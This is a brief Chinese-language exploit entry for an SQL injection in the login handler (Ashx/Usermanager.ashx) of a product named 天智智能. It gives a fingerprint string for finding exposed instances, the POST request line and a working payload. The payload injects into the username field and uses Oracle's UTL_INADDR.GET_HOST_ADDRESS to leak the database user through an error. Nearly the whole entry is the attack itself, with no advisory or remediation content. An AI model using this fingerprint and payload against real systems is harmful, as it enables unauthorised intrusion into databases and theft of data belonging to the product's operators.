# 天智智能Sql注入漏洞

天智智能 ｜ SQL注入 ｜ —
- **指纹**：`"Ashx/Usermanager.ashx"`
- **请求**：`POST /Ashx/Usermanager.ashx HTTP/1.1`

**Payload**
```
type=LOGIN&username=123')+AND+3109%3DUTL_INADDR.GET_HOST_ADDRESS('~'%7C%7C(user)%7C%7C'~')+--&pwd=123&vendor=
```